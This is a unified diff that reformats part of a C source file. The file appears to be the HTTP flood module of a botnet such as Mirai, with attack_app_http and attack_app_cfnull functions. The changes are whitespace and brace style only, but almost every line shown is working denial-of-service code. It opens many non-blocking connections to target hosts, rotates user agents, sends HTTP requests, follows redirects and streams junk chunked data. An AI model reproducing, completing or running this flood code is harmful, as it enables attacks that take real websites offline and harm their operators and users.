@@ -19,9 +19,7 @@
 
 void attack_app_proxy(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-
 }
-
 
 void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
@@ -95,39 +93,39 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
         if (targs[i % targs_len].netmask < 32)
             http_table[i].dst_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));
 
-        switch(rand_next() % 5)
+        switch (rand_next() % 5)
         {
-            case 0:
-                table_unlock_val(TABLE_HTTP_ONE);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
-                table_lock_val(TABLE_HTTP_ONE);
-                break;
-            case 1:
-                table_unlock_val(TABLE_HTTP_TWO);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
-                table_lock_val(TABLE_HTTP_TWO);
-                break;
-            case 2:
-                table_unlock_val(TABLE_HTTP_THREE);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
-                table_lock_val(TABLE_HTTP_THREE);
-                break;
-            case 3:
-                table_unlock_val(TABLE_HTTP_FOUR);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
-                table_lock_val(TABLE_HTTP_FOUR);
-                break;
-            case 4:
-                table_unlock_val(TABLE_HTTP_FIVE);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
-                table_lock_val(TABLE_HTTP_FIVE);
-                break;
+        case 0:
+            table_unlock_val(TABLE_HTTP_ONE);
+            util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
+            table_lock_val(TABLE_HTTP_ONE);
+            break;
+        case 1:
+            table_unlock_val(TABLE_HTTP_TWO);
+            util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
+            table_lock_val(TABLE_HTTP_TWO);
+            break;
+        case 2:
+            table_unlock_val(TABLE_HTTP_THREE);
+            util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
+            table_lock_val(TABLE_HTTP_THREE);
+            break;
+        case 3:
+            table_unlock_val(TABLE_HTTP_FOUR);
+            util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
+            table_lock_val(TABLE_HTTP_FOUR);
+            break;
+        case 4:
+            table_unlock_val(TABLE_HTTP_FIVE);
+            util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
+            table_lock_val(TABLE_HTTP_FIVE);
+            break;
         }
 
         util_strcpy(http_table[i].path, path);
     }
 
-    while(TRUE)
+    while (TRUE)
     {
         fd_set fdset_rd, fdset_wr;
         int mfd = 0, nfds;
@@ -162,7 +160,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                 fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
 
                 ii = 65535;
-                setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));
+                setsockopt(conn->fd, 0, SO_RCVBUF, &ii, sizeof(int));
 
                 addr.sin_family = AF_INET;
                 addr.sin_addr.s_addr = conn->dst_addr;
@@ -170,7 +168,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
                 conn->last_recv = fake_time;
                 conn->state = HTTP_CONN_CONNECTING;
-                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
+                connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
 #ifdef DEBUG
                 printf("[http flood] fd%d started connect\n", conn->fd);
 #endif
@@ -195,7 +193,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
             }
             else if (conn->state == HTTP_CONN_SEND)
             {
-                conn->content_length = -1; 
+                conn->content_length = -1;
                 conn->protection_type = 0;
                 util_zero(conn->rdbuf, HTTP_RDBUF_SIZE);
                 conn->rdbuf_pos = 0;
@@ -332,7 +330,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
             if (FD_ISSET(conn->fd, &fdset_wr))
             {
                 int err = 0;
-                socklen_t err_len = sizeof (err);
+                socklen_t err_len = sizeof(err);
 
                 ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                 if (err == 0 && ret == 0)
@@ -340,7 +338,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 #ifdef DEBUG
                     printf("[http flood] FD%d connected.\n", conn->fd);
 #endif
-                        conn->state = HTTP_CONN_SEND;
+                    conn->state = HTTP_CONN_SEND;
                 }
                 else
                 {
@@ -354,7 +352,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                 }
             }
 
-        if (FD_ISSET(conn->fd, &fdset_rd))
+            if (FD_ISSET(conn->fd, &fdset_rd))
             {
                 if (conn->state == HTTP_CONN_RECV_HEADER)
                 {
@@ -368,7 +366,6 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                         conn->state = HTTP_CONN_INIT;
                         continue;
                     }
-
 
                     // we want to process a full http header (^:
                     if (util_memsearch(generic_memes, ret, "\r\n\r\n", 4) == -1 && ret < 10240)
@@ -446,7 +443,9 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
                             conn->content_length = util_atoi(len_ptr, 10);
                         }
-                    } else {
+                    }
+                    else
+                    {
                         conn->content_length = 0;
                     }
 
@@ -617,7 +616,6 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
                                 loc_ptr = &(loc_ptr[ii]);
 
-
                                 if (util_stristr(loc_ptr, util_strlen(loc_ptr), "http") == 4)
                                 {
                                     //this is an absolute url, domain name change maybe?
@@ -681,7 +679,9 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                         conn->state = HTTP_CONN_RESTART;
 
                     ret = recv(conn->fd, generic_memes, processed, MSG_NOSIGNAL);
-                } else if (conn->state == HTTP_CONN_RECV_BODY) {
+                }
+                else if (conn->state == HTTP_CONN_RECV_BODY)
+                {
                     while (TRUE)
                     {
                         // spooky doods changed state
@@ -783,7 +783,9 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                                         conn->content_length = chunklen + 2;
                                         consumed = new_line_pos;
                                     }
-                                } else {
+                                }
+                                else
+                                {
                                     // get rid of any extra in the buf before we move on...
                                     conn->content_length = conn->rdbuf_pos - consumed;
                                     if (conn->content_length == 0)
@@ -807,8 +809,10 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                             }
                         }
                     }
-                } else if (conn->state == HTTP_CONN_QUEUE_RESTART) {
-                    while(TRUE)
+                }
+                else if (conn->state == HTTP_CONN_QUEUE_RESTART)
+                {
+                    while (TRUE)
                     {
                         errno = 0;
                         ret = recv(conn->fd, generic_memes, 10240, MSG_NOSIGNAL);
@@ -832,7 +836,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                                 conn->state = HTTP_CONN_INIT;
                             }
                             break;
-                        }    
+                        }
                     }
                     if (conn->state != HTTP_CONN_INIT)
                         conn->state = HTTP_CONN_RESTART;
@@ -883,37 +887,37 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
         if (targs[i % targs_len].netmask < 32)
             http_table[i].dst_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));
 
-        switch(rand_next() % 5)
+        switch (rand_next() % 5)
         {
-            case 0:
-                table_unlock_val(TABLE_HTTP_ONE);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
-                table_lock_val(TABLE_HTTP_ONE);
-                break;
-            case 1:
-                table_unlock_val(TABLE_HTTP_TWO);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
-                table_lock_val(TABLE_HTTP_TWO);
-                break;
-            case 2:
-                table_unlock_val(TABLE_HTTP_THREE);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
-                table_lock_val(TABLE_HTTP_THREE);
-                break;
-            case 3:
-                table_unlock_val(TABLE_HTTP_FOUR);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
-                table_lock_val(TABLE_HTTP_FOUR);
-                break;
-            case 4:
-                table_unlock_val(TABLE_HTTP_FIVE);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
-                table_lock_val(TABLE_HTTP_FIVE);
-                break;
+        case 0:
+            table_unlock_val(TABLE_HTTP_ONE);
+            util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
+            table_lock_val(TABLE_HTTP_ONE);
+            break;
+        case 1:
+            table_unlock_val(TABLE_HTTP_TWO);
+            util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
+            table_lock_val(TABLE_HTTP_TWO);
+            break;
+        case 2:
+            table_unlock_val(TABLE_HTTP_THREE);
+            util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
+            table_lock_val(TABLE_HTTP_THREE);
+            break;
+        case 3:
+            table_unlock_val(TABLE_HTTP_FOUR);
+            util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
+            table_lock_val(TABLE_HTTP_FOUR);
+            break;
+        case 4:
+            table_unlock_val(TABLE_HTTP_FIVE);
+            util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
+            table_lock_val(TABLE_HTTP_FIVE);
+            break;
         }
     }
 
-    while(TRUE)
+    while (TRUE)
     {
         fd_set fdset_rd, fdset_wr;
         int mfd = 0, nfds;
@@ -945,7 +949,7 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
                 fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
 
                 ii = 65535;
-                setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));
+                setsockopt(conn->fd, 0, SO_RCVBUF, &ii, sizeof(int));
 
                 addr.sin_family = AF_INET;
                 addr.sin_addr.s_addr = conn->dst_addr;
@@ -953,7 +957,7 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
 
                 conn->last_recv = fake_time;
                 conn->state = HTTP_CONN_CONNECTING;
-                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
+                connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
 #ifdef DEBUG
                 printf("[http flood] fd%d started connect\n", conn->fd);
 #endif
@@ -1053,7 +1057,9 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
                 if (conn->to_send <= 0)
                 {
                     send(conn->fd, "0\r\n", 3, MSG_NOSIGNAL);
-                } else {
+                }
+                else
+                {
                     // EZZZZZZZZZ HACKS
                     if (conn->to_send < 1024)
                         rndbuf[conn->to_send] = 0;
@@ -1126,7 +1132,7 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
                 if (conn->state == HTTP_CONN_CONNECTING)
                 {
                     int err = 0;
-                    socklen_t err_len = sizeof (err);
+                    socklen_t err_len = sizeof(err);
 
                     ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                     if (err == 0 && ret == 0)
@@ -1149,7 +1155,7 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
                 }
                 else if (conn->state == HTTP_CONN_SNDBUF_WAIT)
                 {
-					conn->state = HTTP_CONN_SEND_JUNK;
+                    conn->state = HTTP_CONN_SEND_JUNK;
                 }
             }
 
@@ -1172,4 +1178,3 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
 #endif
     }
 }
-
